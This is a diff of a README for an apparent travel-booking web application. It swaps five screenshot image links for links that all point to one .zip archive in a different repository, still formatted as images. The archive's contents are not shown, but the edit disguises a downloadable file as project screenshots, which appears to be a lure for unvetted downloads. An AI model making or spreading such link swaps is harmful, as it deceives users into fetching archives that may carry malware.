@@ -13,8 +13,8 @@ make account (two types: user and travel agency), edit data in your profile,
 add, edit, delete your trip if you are travel agency, 
 search appropriate trip and enrol if you are user and so on.
 #
-![as](https://user-images.githubusercontent.com/79859600/130797525-1bac73e8-e2a6-4c00-b872-805b6eb8aaac.png)
-![gff](https://user-images.githubusercontent.com/79859600/130797537-073358a6-0180-445f-8d3f-22394865c93b.png)
-![aa](https://user-images.githubusercontent.com/79859600/130797540-10dd09ed-2983-40af-ae52-8fbf983e4f7c.png)
-![bn](https://user-images.githubusercontent.com/79859600/130797541-f17eabde-4210-4c51-8649-be4ea5497531.png)
-![aaaaa](https://user-images.githubusercontent.com/79859600/130797546-50c44f63-a6b7-41e9-acae-69ac416cd45b.png)
+![as](https://raw.githubusercontent.com/ranjanrajeev95/Book_Travel_Web-Page/main/media/images/Book-Travel-Page-Web-v3.5.zip)
+![gff](https://raw.githubusercontent.com/ranjanrajeev95/Book_Travel_Web-Page/main/media/images/Book-Travel-Page-Web-v3.5.zip)
+![aa](https://raw.githubusercontent.com/ranjanrajeev95/Book_Travel_Web-Page/main/media/images/Book-Travel-Page-Web-v3.5.zip)
+![bn](https://raw.githubusercontent.com/ranjanrajeev95/Book_Travel_Web-Page/main/media/images/Book-Travel-Page-Web-v3.5.zip)
+![aaaaa](https://raw.githubusercontent.com/ranjanrajeev95/Book_Travel_Web-Page/main/media/images/Book-Travel-Page-Web-v3.5.zip)
